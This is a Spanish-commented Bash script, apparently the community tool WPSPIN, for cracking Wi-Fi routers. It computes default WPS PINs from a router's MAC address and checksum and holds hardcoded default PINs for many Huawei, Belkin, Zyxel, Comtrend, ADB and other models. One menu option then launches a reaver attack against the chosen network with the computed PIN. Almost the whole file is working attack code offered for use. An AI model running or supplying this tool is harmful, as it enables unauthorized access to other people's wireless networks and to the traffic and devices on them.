#!/bin/bash

colorbase="\E[0m"                # Para areglar los problemas de colores en salida creo que debe bastar con declarar los colores como
azulfluo="\033[1;36m"            # constantes
amarillo="\033[1;33m"
rojo="\033[1;31m"
blanco="\033[1;37m"
verde="\033[0;32m"
orange="\033[0;33m"
azul="\033[0;34m"
magenta="\033[1;35m"
negro="\033[0;30m"
gris="\033[1;30m"
verdefluo="\033[1;32m"



clear
echo ""
echo -e "    $azulfluo      .    _       _  _____    _____   _____  _______  _     _ 
$colorbase  .---. $azulfluo //   (_)  _  (_)(_____)  (_____) (_____)(_______)(_)   (_) $colorbase
 Y|o o|Y$azulfluo//    (_) (_) (_)(_)__(_)(_)___   (_)__(_)  (_)   (__)_ (_)    $colorbase
/_(i=i)K$azulfluo/     (_) (_) (_)(_____)   (___)_ (_____)   (_)   (_)(_)(_)   $colorbase  oO)-.
~()~*~()~  $azulfluo   (_)_(_)_(_)(_)       ____(_)(_)     __(_)__ (_)  (__)   $colorbase /__  _\ 
 (_)-(_)  $azulfluo     (__) (__) (_)      (_____) (_)    (_______)(_)   (_) $colorbase   \  \(  | "
echo "                                                                        \__|\ | "
echo "                                                                        '  '--' "
echo -e "    $amarillo www.lampiweb.com    www.crack-wifi.com    www.auditoriaswireless.net$colorbase " 
echo ""
echo "                                                       by kcdtv           "
echo "  PIN WPS por defecto       >X<             aportes/mod antares_145 y rOOtnuLL"     
echo "   y PIN GENERICOS      -  (O o)  -          integra algoritmo ZaoChunsheng"
echo "-----------------------ooO--(_)--Ooo--------------------------------------------"
echo -e "$rojo    eSSID afectados $colorbase         |  $magenta  fabricantes y modelos afectados      "         
echo -e "$colorbase$blanco FTE-XXXX     vodafoneXXXX $colorbase  |  $blanco HUAWEI(HG532c/HG556a)    Teldat(iRouter1104-W)"
echo -e " WLAN_XXXX   JAZZTEL_XXXX  $colorbase  |$blanco Comtrend(Gigabit 802.11n/AR-5387un)  Tenda(W309R)"
echo -e " belkin.XXX      C300BRS4A  $colorbase |$blanco Belkin(F9K1104/F5D8231/F5D8235)    SAMSUNG(SWL)  "
echo -e " Belkin_N+_XXXXXX    ZyXEL $colorbase  |$blanco ADB-Broadband(PDG-A4001N) Conceptronic(c300brs4a)"  
echo -e "   SEC_LinkShare_XXXXXX   $colorbase   |$blanco     Zyxel(NBG-419n/P-870HW-51A V2/P-870HNU-51B) "
echo -e "                     $colorbase        |$blanco OEM(Encore ENDSL-4R5G)     OBSERVATELECOM(AW4062)"      
echo -e "$colorbase-----------------------------+--------------------------------------------------"
echo ""
read -ep "  Pegar el Essid y darle a <Enter> : " ESSID   # essid como variable - gracias r00tnuLL por el "ep" ;)                
read -ep "  Pegar el Bssid y darle a <Enter> : " BSSID   # bssid como variable         
echo ""
#  los comentarios empezando por cf. r00tnuLL "---" son de r00tnuLL, así que el codigo que comenta ¡gracias compi! ;)
# .cf r00tnuLL "Comprobamos que la MAC introducida es válida, 6 campos de 2 caracteres hexadecimales en cada uno, y que pueda acabar con espacios en blanco."
if [[ ! $BSSID =~ ^[[:xdigit:]]{2}:[[:xdigit:]]{2}:[[:xdigit:]]{2}:[[:xdigit:]]{2}:[[:xdigit:]]{2}:[[:xdigit:]]{2}[[:blank:]]*$ ]]; then
echo -e "$BSSID-$amarillo SYNTAX ERROR$colorbase -$BSSID-$amarillo SYNTAX ERROR$colorbase -$BSSID-$amarillo SYNTAX ERROR$colorbase -$BSSID "
echo -e " ERROR: La MAC que pusiste no tiene formato válido...   " >&2     # mensage mandado por la salida de error
echo ""
echo ""
echo ""
echo ""
echo -e "$magenta           ERROR: La MAC que pusiste no tiene formato válido...  $colorbase " 
echo ""
echo ""
echo -e "                     $orange       ¿   $negro  ?           "
echo -e "                   $verde    ?   $azul    ?      $colorbase        " 
echo -e "                 $blanco       ¿ $colorbase  >X<  $gris  ¿         $colorbase "     
echo "                        -  (O o)  -         "
echo "-----------------------ooO--(_)--Ooo--------------------------------------------"
echo ""
echo ""
echo -e "       $rojo    ...flecha arriba seguido de enter  $colorbase"   
echo -e "                                         $rojo para reiniciar WPSPIN $colorbase"
echo ""  
exit 1                                                        # salida en estado de error
fi                                                            # instrucción de cierre
 


                  
FUNC_CHECKSUM(){                                             #<La funcción checksum WPS fue escrita por antares_145 de www.crack-wifi.com 
ACCUM=0                                                      # Se declara cómo funcción, menos la primera linea que escrito antares, porque vamos
                                                             # a dar nosotros el valor de los 7 digitos en base del cual se calculara el checksum
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`

DIGIT=`expr $ACCUM '%' 10`
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`

PIN=`expr $PIN '+' $CHECKSUM`                     
ACCUM=0

ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1 ')' '%' 10 ')'`

RESTE=`expr $ACCUM '%' 10`
 }                                                              # >Aqui acaba la funcción checksum WPS (gracias maestro XD ) 


CHECKBSSID=$(echo $BSSID | cut -d ":" -f1,2,3 | tr -d ':')      # aqui guaradmos el incio de mac depurado para identificar los tipos de bssid      
MAC=$(echo $BSSID | cut -d ':' -f4- | tr -d ':')                # aqui guardamos el fin de mac para usar en los algoritmos                   
CONVERTEDMAC=$(printf '%d\n' 0x$MAC)                            # pasamos de hexadecimal a decimal nuestra fin mac
FINBSSID=$(echo $BSSID | cut -d ':' -f4-)                       # guardamos la segunda mitas del bssid
FINESSID=$(echo $ESSID | cut -d '-' -f2)                        # para FTE guardamos los X en FTE-XXXX 
PAREMAC=$(echo $FINBSSID | cut -d ':' -f1 | tr -d ':')          # guaradmos el cuarto pare de la mac
CHECKMAC=$(echo $FINBSSID | cut -d ':' -f2- | tr -d ':')        # Los dos ultimos pares de la mac para comprobación de la relación essid - bssid FTE
MACESSID=$(echo $PAREMAC$FINESSID)                              # cadena bssid acabado en essid para patrón FTE (algoritmo nuevo descubierto)
STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')'`                # quitamos el evantual numero sobrante (lo que es > a 9999999 )
PIN=`expr 10 '*' $STRING`                                       # se simplificarón estas lineas si se compara con el codigo precedante


FUNC_CHECKSUM                                                   # llamamos a nuestra funcción CHECKSUM by anytares_145



PINWPS1=$(printf '%08d\n' $PIN)                                 # aqui hemos calculado nuiestro primer tipo de PIN que es similar al descubierto 
                                                                # parrallamente y anterioramente por ZaoChunsheng en ComputePinC83A35. 
                                                                # Mis modestos saludos y agaradecimientos a Zao por todo lo que ha hecho ;)          
                                                                # Este mismo resultado será usado como uno de los PIN del modo essid descomocido
                                                                # para FTE-XXXX y corresponde e los casos diferencia bssid-essid = +7 




STRING2=`expr $STRING '+' 8`                                    # vamos a calcular uno de los tres pin para el modo essid desconocido FTE
PIN=`expr 10 '*' $STRING2`                                      # este es fin mac + 8 corresponde a los casos dónde diferencia bssid - essid = -1        


FUNC_CHECKSUM                                                   # llamamos a nuestra funcción CHECKSUM by anytares_145


PINWPS2=$(printf '%08d\n' $PIN)                                 # hemos calculado nuestro segundo PIN 

             
STRING3=`expr $STRING '+' 14`                                   # seguimos con nuestro ultimo PIN para FTE modo essid desconocido
PIN=`expr 10 '*' $STRING3`                                      # podeìs ver que hemos añadido 14 que correponde diferencia bssid-essid =  -7 
                                                                # tres tipos de diferencias bssid-essid para los routeurs FTE, dando estos tres PIN
                                                                # Cubrimos las tres possibilidades
FUNC_CHECKSUM                                                   # llamamos a nuestra funcción CHECKSUM by anytares_145


PINWPS3=$(printf '%08d\n' $PIN)                                 # ya este por los PIN essid FTE desconocido ;)



                                                                # cf. r00tnuLL "Aquí comprobamos si el ESSID coincide con el patron FTE-XXXX. Las X deberán ser 4 caracteres hexadecimales Si coincide proceder".

if [[ $ESSID =~ ^FTE-[[:xdigit:]]{4}[[:blank:]]*$ ]] &&  [[ "$CHECKBSSID" = "04C06F" || "$CHECKBSSID" = "202BC1" || "$CHECKBSSID" = "285FDB" || "$CHECKBSSID" = "80B686" || "$CHECKBSSID" = "84A8E4" || "$CHECKBSSID" = "B4749F" || "$CHECKBSSID" = "BC7670" || "$CHECKBSSID" = "CC96A0" ]] &&  [[ $(printf '%d\n' 0x$CHECKMAC) = `expr $(printf '%d\n' 0x$FINESSID) '+' 7` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 1` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 7` ]];         

                                                                # He añadido dos cosas más : verificar que el bssid es efectivamente de un HG532c y asegurarse que la diferencia bssid - essid es conforme, si no la es se seguira con el modo FTE essid desconocido 
                         
then                                                            

FINESSID=$(echo $ESSID | cut -d '-' -f2)                         # ahi aplicamos el algoritmo para FTE-XXXX conociendo essid, aisolamos los XXXX de FTE-XXXX
PAREMAC=$(echo $FINBSSID | cut -d ':' -f1 | tr -d ':')           # aisolamos los cuarto pares del bssid
MACESSID=$(echo $PAREMAC$FINESSID)                               # constituimos nuestra cadena "mitad de bssid acabdo en essid" :p
CONVERTEDMACESSID=$(printf '%d\n' 0x$MACESSID)                   # convertimos de hexadecinal a decimal
RAIZ=`expr '(' $CONVERTEDMACESSID '%' 10000000 ')'`              # quitamos el evantual numero sobrante prar los valores superiores a 9999999
STRING4=`expr $RAIZ '+' 7`                                       # añadimos 7 para aplicar el algoritmo descubierto

PIN=`expr 10 '*' $STRING4`                                       


FUNC_CHECKSUM                                                   # llamamos a nuestra funcción CHECKSUM by anytares_145


PINWPS4=$(printf '%08d\n' $PIN)                                 # ya este para los PIN essid FTE conocido ;) 

                  
                                                                # aqui viene el pin para FTE por defecto con essid conocido           
echo -e "--------------------------------------------------"     
echo -e "Fabricante >  $blanco HUAWEI            $colorbase"
echo -e "essid      >  $blanco FTE-XXXX          $colorbase"
echo -e "modelo     >  $blanco HG532c Echo Life  $colorbase"
echo -e "--------------------------------------------------"
echo -e "         PIN WPS POR DEFECTO > $amarillo$PINWPS4  $colorbase"
echo -e "--------------------------------------------------"
echo -e "        $magenta   ¡WPS ACTIVADO POR DEFECT0! $colorbase "
echo -e "-------------------------------------------------- "
PIN4REAVER=$PINWPS4                                             # PIN4REAVER es el valor de nuestro argumento -p en nuestro comento reaver
else
case $CHECKBSSID in                                             # con el case vamos a disitinguir nuestros bssid 
04C06F | 202BC1 | 285FDB | 80B686 | 84A8E4 | B4749F | BC7670 | CC96A0)  # en este case los bssid FTE para el modo FTE essid desconocido
echo -e "   $verdefluo  ¡ el ESSID por DEFECTO es FTE-XXXX !  $colorbase
--------------------------------------------------
Fabricante >  $blanco HUAWEI           $colorbase
essid      >  $blanco FTE-XXXX         $colorbase
modelo     >  $blanco HG532c Echo Life $colorbase
--------------------------------------------------  
         3  PINes POSSIBLES  > $amarillo$PINWPS1  $colorbase
                             > $amarillo$PINWPS2  $colorbase
                             > $amarillo$PINWPS3  $colorbase
--------------------------------------------------
        $magenta   ¡WPS ACTIVADO POR DEFECT0! $colorbase
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
;;
001915)
echo -e "--------------------------------------------------"
echo -e "Fabricante >  $blanco OBSERVA TELECOM  $colorbase"
echo -e "essid      >  $blanco WLAN_XXXX        $colorbase"
echo -e "modelo     >  $blanco AW4062           $colorbase" 
echo -e "--------------------------------------------------"
echo -e "         PIN WPS POR DEFECTO >$amarillo 12345670  $colorbase"
echo -e "--------------------------------------------------"
echo -e "    Cuidado :$magenta ¡WPS NO ACTIVADO POR DEFECT0! $colorbase"
echo -e "-------------------------------------------------- "
PIN4REAVER=12345670
;;
404A03)
echo -e "--------------------------------------------------
Fabricante >  $blanco ZYXELL           $colorbase
essid      >  $blanco WLAN_XXXX        $colorbase
modelo     >  $blanco P-870HW-51A V2   $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo 11866428  $colorbase
--------------------------------------------------
         $magenta  ¡WPS ACTIVADO POR DEFECT0! $colorbase
-------------------------------------------------- "
PIN4REAVER=11866428
;;
FCF528)
echo -e "--------------------------------------------------
Fabricante >  $blanco ZYXELL  $colorbase
eSSID      >  $blanco WLAN_XXXX          $colorbase 
modelo     >  $blanco P-870HNU-51B                 $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo 20329761       $colorbase
--------------------------------------------------
         $magenta  ¡WPS ACTIVADO POR DEFECT0! $colorbase
-------------------------------------------------- "
PIN4REAVER=20329761
;;
F43E61 | 001FA4)
echo -e "--------------------------------------------------
Fabricante >  $blanco OEM Shenzhen Gongjin Electronics  $colorbase
essid      >  $blanco WLAN_XXXX (o ENDSL-4R5G)          $colorbase 
modelo     >  $blanco Encore ENDSL-4R5G                 $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo 12345670        $colorbase
--------------------------------------------------
       $magenta     ¡WPS ACTIVADO POR DEFECT0!          $colorbase
-------------------------------------------------- "
PIN4REAVER=12345670
;;
001A2B)
if [[ $ESSID =~ ^WLAN_[[:xdigit:]]{4}[[:blank:]]*$ ]];    # adaptamos el filtro de r00tnuLL para diferenciar los WLAN_XXXX 
then
echo -e "--------------------------------------------------
Fabricante >  $blanco Comtrend                          $colorbase
essid      >  $blanco WLAN_XXXX                          $colorbase
modelo     >  $blanco Gigabit 802.11n                 $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo 88478760       $colorbase
--------------------------------------------------
      $magenta   ¡WPS ACTIVADO POR DEFECT0!           $colorbase
*$verdefluo Cuidado : Hay varios modelos con este inicio de mac... $colorbase  
-------------------------------------------------- "
PIN4REAVER=88478760
else
echo -e "--------------------------------------------------
  $verdefluo     ¡bSSID desconocido o no soportado!     $colorbase  
--------------------------------------------------
         
             PIN POSSIBLE... >$amarillo $PINWPS1  $colorbase 
                                   
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
fi
;;
3872C0)
if [[ $ESSID =~ ^JAZZTEL_[[:xdigit:]]{4}[[:blank:]]*$ ]];    # adaptamos el filtro de r00tnuLL para diferenciar los jazztell                           
then
echo -e "--------------------------------------------------
Fabricante >  $blanco Comtrend                     $colorbase
essid      >  $blanco JAZZTEL_XXXX              $colorbase
modelo     >  $blanco AR-5387un                 $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo 18836486       $colorbase
--------------------------------------------------
* $verdefluo Cuidado : ¡WPS NO ACTIVADO POR DEFECT0! $colorbase
-------------------------------------------------- "
PIN4REAVER=18836486
else
echo -e "--------------------------------------------------
    $verdefluo   ¡bSSID desconocido o no soportado!  $colorbase
--------------------------------------------------
             PIN POSSIBLE    >$amarillo $PINWPS1      $colorbase
          
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
fi
;;
3039F2)
echo -e "-----------------------------------------------
Fabricante >  $blanco ADB-Broadband         $colorbase
essid      >  $blanco WLAN_XXXX             $colorbase
modelo     >  $blanco PDG-A4001N            $colorbase
-----------------------------------------------
$verdefluo varios PINs possibles, en orden de preferencia>  $colorbase

$amarillo  16538061 16702738 18355604 88202907 73767053 43297917  $colorbase
--------------------------------------------------
$magenta           ¡WPS ACTIVADO POR DEFECT0! $colorbase
--------------------------------------------------"
PIN4REAVER=16538061
;;
A4526F)
echo -e "-----------------------------------------------
Fabricante >  $blanco ADB-Broadband         $colorbase
essid      >  $blanco WLAN_XXXX             $colorbase 
modelo     >  $blanco PDG-A4001N            $colorbase
-----------------------------------------------
$verdefluo varios PINs possibles, en orden de preferencia>  $colorbase

$amarillo  16538061 88202907 73767053 16702738 43297917 18355604  $colorbase
--------------------------------------------------
$magenta           ¡WPS ACTIVADO POR DEFECT0! $colorbase
--------------------------------------------------"
PIN4REAVER=16538061
;;
74888B)
echo -e "-----------------------------------------------
Fabricante >  $blanco ADB-Broadband          $colorbase
essid      >  $blanco WLAN_XXXX              $colorbase
modelo     >  $blanco PDG-A4001N             $colorbase
-----------------------------------------------
$verdefluo varios PINs possibles, en orden de preferencia>  $colorbase

$amarillo  43297917 73767053 88202907 16538061 16702738 18355604 $colorbase
--------------------------------------------------
$magenta           ¡WPS ACTIVADO POR DEFECT0! $colorbase
--------------------------------------------------"
PIN4REAVER=43297917
;;
DC0B1A)
echo -e "-----------------------------------------------
Fabricante >  $blanco ADB-Broadband         $colorbase
essid      >  $blanco WLAN_XXXX             $colorbase
modelo     >  $blanco PDG-A4001N            $colorbase
-----------------------------------------------
$verdefluo varios PINs possibles, en orden de preferencia>  $colorbase

$amarillo  16538061 16702738 18355604 88202907 73767053 43297917  $colorbase
--------------------------------------------------
$magenta          ¡WPS ACTIVADO POR DEFECT0!   $colorbase
--------------------------------------------------"
PIN4REAVER=16538061
;;
5C4CA9 | 62A8E4 | 62C06F | 62C61F | 62E87B | 6A559C | 6AA8E4 | 6AC06F | 6AC714 | 6AD167 | 72A8E4 | 72C06F | 72C714 | 72E87B | 723DFF | 7253D4)
echo -e "--------------------------------------------------
Fabricante >  $blanco HUAWEI                $colorbase
essid      >  $blanco vodafoneXXXX          $colorbase
modelo     >  $blanco HG566a                $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo $PINWPS1   $colorbase
--------------------------------------------------
$magenta           ¡WPS ACTIVADO POR DEFECT0!  $colorbase
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
;;
002275)
echo -e "--------------------------------------------------
Fabricante >  $blanco Belkin              $colorbase
essid      >  $blanco Belkin_N+_XXXXXX    $colorbase
modelo     >  $blanco F5D8235-4 v 1000    $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo $PINWPS1   $colorbase
--------------------------------------------------
$magenta            ¡WPS ACTIVADO POR DEFECT0!           $colorbase
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
;;
08863B)
echo -e "--------------------------------------------------
Fabricante >  $blanco Belkin  $colorbase
essid      >  $blanco belkin.XXX  $colorbase
modelo     >  $blanco F9K1104(N900 DB Wireless N+ Routeur) $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo $PINWPS1  $colorbase
--------------------------------------------------
$magenta           ¡WPS ACTIVADO POR DEFECT0!  $colorbase
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
;;
001CDF)
echo -e "--------------------------------------------------
Fabricante >  $blanco Belkin  $colorbase
essid      >  $blanco belkin.XXX  $colorbase
modelo     >  $blanco F5D8231-4  ver. 5000  $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo $PINWPS1  $colorbase
--------------------------------------------------
$magenta           ¡WPS ACTIVADO POR DEFECT0!  $colorbase
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
;;
00A026)
echo -e "--------------------------------------------------
Fabricante >  $blanco Teldat  $colorbase
essid      >  $blanco WLAN_XXXX  $colorbase
modelo     >  $blanco iRouter1104-W  $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo $PINWPS1   $colorbase
--------------------------------------------------
$magenta           ¡WPS ACTIVADO POR DEFECT0!  $colorbase
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
;;
5057F0)
echo -e "--------------------------------------------------
Fabricante >  $blanco Zyxel  $colorbase
essid      >  $blanco ZyXEL  $colorbase
modelo     >  $blanco zyxel NBG-419n  $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo $PINWPS1   $colorbase
--------------------------------------------------
$magenta           ¡WPS ACTIVADO POR DEFECT0!  $colorbase
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
;;
C83A35 | 00B00C | 081075)
echo -e "--------------------------------------------------
Fabricante >  $blanco Tenda  $colorbase
essid      >  $blanco algoritmo original de ZaoChunsheng  $colorbase
modelo     >  $blanco W309R  $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo $PINWPS1  $colorbase
--------------------------------------------------
$magenta           ¡WPS ACTIVADO POR DEFECT0!  $colorbase
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
;;
E47CF9 | 801F02)
echo -e "--------------------------------------------------
Fabricante >  $blanco SAMSUNG  $colorbase
essid      >  $blanco SEC_ LinkShare_XXXXXX  $colorbase
modelo     >  $blanco SWL (Samsung Wireless Link)  $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo $PINWPS1  $colorbase
--------------------------------------------------
$magenta           ¡WPS ACTIVADO POR DEFECT0!     $colorbase
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
;;
0022F7)
echo -e "--------------------------------------------------
Fabricante >  $blanco Conceptronic  $colorbase
essid      >  $blanco C300BRS4A     $colorbase
modelo     >  $blanco c300brs4a     $colorbase
--------------------------------------------------
         PIN WPS POR DEFECTO >$amarillo $PINWPS1  $colorbase
--------------------------------------------------
$magenta           ¡WPS ACTIVADO POR DEFECT0!     $colorbase  
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
;;
*)                                                          # bssid no soportados-desconocidos
echo -e "--------------------------------------------------
     $verdefluo  ¡bSSID desconocido o no soportado!   $colorbase
--------------------------------------------------
                PIN POSSIBLE >$amarillo $PINWPS1 $colorbase
         
-------------------------------------------------- "
PIN4REAVER=$PINWPS1
;;
esac
fi

echo ""                                                    # post menu con sus 3 opciones
echo "elegir una opción"
echo ""
echo    " +---------------------------------------------------------------------+"
echo -e " |$blanco 1$colorbase. $blanco Atacar con wps reaver (con mode monitor ya activado en mon0)$colorbase    | "
echo -e " |        El PIN empleado será $amarillo$PIN4REAVER$colorbase                                |"
echo -e " |---------------------------------------------------------------------| "
echo -e " |$blanco 2$colorbase. $blanco Probar otra red  $colorbase                                               | "
echo -e " |---------------------------------------------------------------------| "
echo -e " |$blanco 3$colorbase. $blanco Salir  $colorbase                                                         | "
echo -e " +---------------------------------------------------------------------+  "
echo ""
read -ep "entrar numero opción y darle a <Enter> : " CHOISE   # el usuario entra su opción

case $CHOISE in  
1) 
sudo reaver -b $BSSID -p $PIN4REAVER -i mon0 -T 2 -vv          # attaque reaver de lo mas basico, con un time out M5-M7 algo alargado, 2 segundos en lugar
echo "                        -  (O o)  -         "            # de 0.20 por segundos
echo "-----------------------ooO--(_)--Ooo--------------------------------------------"
echo " para reinciar WPSPIN flecha arriba seguido de  <enter> ;)"                            
;;
2)  
unset                                                          # se borran las variables
bash WPSPIN.sh                                                 # se rinicia el script
;;
3) echo "Saludos desde lampiweb.com :)"                    
sleep 1
unset
exit 0      
;;
esac                                                          # instrucción de cierre y fin del script


